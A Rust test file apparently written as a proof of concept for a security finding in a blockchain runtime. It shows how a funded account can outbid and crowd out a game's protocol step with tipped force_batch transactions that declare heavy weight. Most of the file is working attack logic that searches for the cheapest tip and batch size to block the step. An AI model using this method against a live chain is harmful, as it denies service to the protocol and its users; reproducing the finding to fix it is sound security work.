//! Temporary PoC for security finding #8936: a funded account outbids and crowds out a game step.

use super::*;
use frame_support::{
	dispatch::{DispatchClass, DispatchInfo, GetDispatchInfo},
	storage::{with_transaction, TransactionOutcome},
	traits::SignedTransactionBuilder,
};
use indiv_support::tx_priority::PROTOCOL_LIVENESS;
use sp_runtime::{
	traits::TransactionExtension,
	transaction_validity::{TransactionPriority, TransactionSource},
	DispatchError,
};

const ALICE: Sr25519Keyring = Sr25519Keyring::Alice;

fn extension(nonce: u32, tip: u128) -> TxExtensionV0 {
	(
		frame_system::AuthorizeCall::<Runtime>::new(),
		frame_system::CheckNonZeroSender::<Runtime>::new(),
		frame_system::CheckSpecVersion::<Runtime>::new(),
		frame_system::CheckTxVersion::<Runtime>::new(),
		frame_system::CheckGenesis::<Runtime>::new(),
		frame_system::CheckEra::<Runtime>::from(generic::Era::Immortal),
		frame_system::CheckNonce::<Runtime>::from(nonce),
		frame_system::CheckWeight::<Runtime>::new(),
		pallet_asset_tx_payment::ChargeAssetTxPayment::<Runtime>::from(tip, None),
		frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
	)
		.into()
}

fn signed(call: RuntimeCall, tip: u128) -> UncheckedExtrinsic {
	let account = ALICE.to_account_id();
	let ext = extension(frame_system::Pallet::<Runtime>::account_nonce(&account), tip);
	let payload = generic::SignedPayload::new(call.clone(), ext.clone()).unwrap();
	let signature = payload.using_encoded(|bytes| ALICE.sign(bytes));
	UncheckedExtrinsic::new_signed_transaction(
		call,
		account.into(),
		MultiSignature::Sr25519(signature),
		ext,
	)
}

/// `force_batch` of a root-only call whose declared weight grows with an argument.
/// The inner call fails with `BadOrigin` and reports no actual weight.
fn attack_call(subkeys: u32, class: DispatchClass) -> RuntimeCall {
	let mut calls = vec![RuntimeCall::System(frame_system::Call::kill_prefix {
		prefix: vec![],
		subkeys,
	})];
	if class == DispatchClass::Normal {
		calls.push(RuntimeCall::System(frame_system::Call::remark { remark: vec![] }));
	}
	RuntimeCall::Utility(pallet_utility::Call::force_batch { calls })
}

/// The dispatch info and length `CheckWeight` sees for a metered game step.
fn step_info() -> (DispatchInfo, usize) {
	let call = RuntimeCall::Game(indiv_pallet_game::Call::advance_shuffle {
		game_index: 0,
		discriminator: 0,
	});
	let ext = extension(0, 0);
	let mut info = call.get_dispatch_info();
	info.extension_weight = ext.weight(&call);
	let len = UncheckedExtrinsic::from_parts(
		call,
		generic::Preamble::General(sp_runtime::traits::ExtensionVariant::V0(ext)),
	)
	.encoded_size();
	(info, len)
}

fn rollback<R>(f: impl FnOnce() -> R) -> R {
	with_transaction(|| TransactionOutcome::Rollback(Ok::<_, DispatchError>(f()))).unwrap()
}

fn priority_of(call: &RuntimeCall, tip: u128) -> TransactionPriority {
	rollback(|| {
		Executive::validate_transaction(
			TransactionSource::External,
			signed(call.clone(), tip),
			Default::default(),
		)
		.expect("attack transaction is valid")
		.priority
	})
}

/// Smallest tip that puts the transaction above the game step in the pool.
fn min_outbidding_tip(call: &RuntimeCall) -> u128 {
	let (mut lo, mut hi) = (0u128, 2_000 * UNITS);
	assert!(priority_of(call, hi) > PROTOCOL_LIVENESS);
	while lo < hi {
		let mid = (lo + hi) / 2;
		if priority_of(call, mid) > PROTOCOL_LIVENESS {
			hi = mid
		} else {
			lo = mid + 1
		}
	}
	lo
}

/// Apply `k` attack transactions of `subkeys` each, then ask `CheckWeight` about the step.
/// Test externalities record no proof, so `StorageWeightReclaim` is inert here. Return all
/// booked proof size of `class`, the most the on-chain reclaim can return.
fn reclaim_all_proof(class: DispatchClass) {
	frame_system::BlockWeight::<Runtime>::mutate(|w| {
		let proof = w.get(class).proof_size();
		w.reduce(Weight::from_parts(0, proof), class);
	});
}

/// Whether `k` attack transactions of `subkeys` are all included.
fn attack_fits(k: u32, subkeys: u32, class: DispatchClass) -> bool {
	rollback(|| {
		(0..k).all(|_| {
			let ok =
				matches!(Executive::apply_extrinsic(signed(attack_call(subkeys, class), 0)), Ok(Ok(())));
			reclaim_all_proof(class);
			ok
		})
	})
}

fn step_refused_after(k: u32, subkeys: u32, class: DispatchClass) -> bool {
	rollback(|| {
		for _ in 0..k {
			let outcome = Executive::apply_extrinsic(signed(attack_call(subkeys, class), 0));
			assert!(matches!(outcome, Ok(Ok(()))), "attack tx included: {outcome:?}");
			reclaim_all_proof(class);
		}
		let (info, len) = step_info();
		frame_system::CheckWeight::<Runtime>::do_prepare(&info, len, 0).is_err()
	})
}

/// Smallest per-transaction `subkeys` such that `k` transactions crowd out the step.
fn min_subkeys(k: u32, class: DispatchClass) -> Option<u32> {
	// Largest `subkeys` for which all `k` transactions are still included.
	let (mut lo, mut hi) = (0u32, 1_000_000u32);
	while lo < hi {
		let mid = (lo + hi + 1) / 2;
		if attack_fits(k, mid, class) {
			lo = mid
		} else {
			hi = mid - 1
		}
	}
	let max_fitting = lo;
	if !step_refused_after(k, max_fitting, class) {
		return None;
	}
	let (mut lo, mut hi) = (0u32, max_fitting);
	while lo < hi {
		let mid = (lo + hi) / 2;
		if step_refused_after(k, mid, class) {
			hi = mid
		} else {
			lo = mid + 1
		}
	}
	Some(lo)
}

fn units(planck: u128) -> f64 {
	planck as f64 / UNITS as f64
}

#[test]
fn poc_8936_step_crowding() {
	new_test_ext().execute_with(|| {
		let alice = ALICE.to_account_id();
		Balances::set_balance(&alice, 100_000 * UNITS);

		let (step, step_len) = step_info();
		let limits = RuntimeBlockWeights::get();
		println!("max_block              {:?}", limits.max_block);
		println!("Normal max_total       {:?}", limits.get(DispatchClass::Normal).max_total);
		println!("Operational reserved   {:?}", limits.get(DispatchClass::Operational).reserved);
		println!(
			"game step total weight {:?} class {:?} len {step_len}",
			step.total_weight(),
			step.class
		);

		for class in [DispatchClass::Normal, DispatchClass::Operational] {
			for k in [1u32, 4, 16] {
				let Some(n) = min_subkeys(k, class) else {
					println!("{class:?} x{k}: cannot crowd out the step");
					continue;
				};
				let call = attack_call(n, class);
				let info = call.get_dispatch_info();
				assert_eq!(info.class, class);
				let tip = min_outbidding_tip(&call);

				// Apply the k transactions for real and measure what Alice pays and what stays booked.
				let before = Balances::free_balance(&alice);
				let (booked, refused) = rollback(|| {
					for _ in 0..k {
						let outcome = Executive::apply_extrinsic(signed(call.clone(), tip));
						assert!(matches!(outcome, Ok(Ok(()))));
						reclaim_all_proof(class);
					}
					let paid = before - Balances::free_balance(&alice);
					let booked = frame_system::BlockWeight::<Runtime>::get();
					let refused =
						frame_system::CheckWeight::<Runtime>::do_prepare(&step, step_len, 0).is_err();
					println!(
						"{class:?} x{k}: subkeys {n}, declared {:?} per tx, tip {:.3} per tx, \
						 paid {:.3} total ({:.4} fees), booked after dispatch {:?}",
						info.total_weight(),
						units(tip),
						units(paid),
						units(paid - tip * k as u128),
						booked.get(class),
					);
					(booked, refused)
				});
				let _ = booked;
				assert!(refused, "the game step no longer fits the block");
				assert!(
					priority_of(&call, tip) > PROTOCOL_LIVENESS,
					"the attack transaction sorts above the game step"
				);
			}
		}
	});
}
